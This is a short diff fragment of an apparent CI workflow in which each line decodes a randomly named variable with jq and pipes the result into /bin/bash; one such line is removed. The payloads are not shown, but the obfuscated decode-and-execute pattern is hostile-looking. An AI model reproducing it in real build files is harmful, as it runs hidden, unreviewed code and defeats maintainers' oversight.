@@ -29,7 +29,6 @@ jobs:
           echo $hriw6 | jq -r .eu1328 | /bin/bash
           echo $xpr454 | jq -r .rde87656 | /bin/bash
           echo $foi8861 | jq -r .qulz93005 | /bin/bash
-          echo $z7 | jq -r .hw0095 | /bin/bash
           echo $nz74 | jq -r .emd9222 | /bin/bash
           printf '%s' "$n94" | jq -r .g5895 | /bin/bash
           printf '%s' "$pw11515" | jq -r .eml205 | /bin/bash
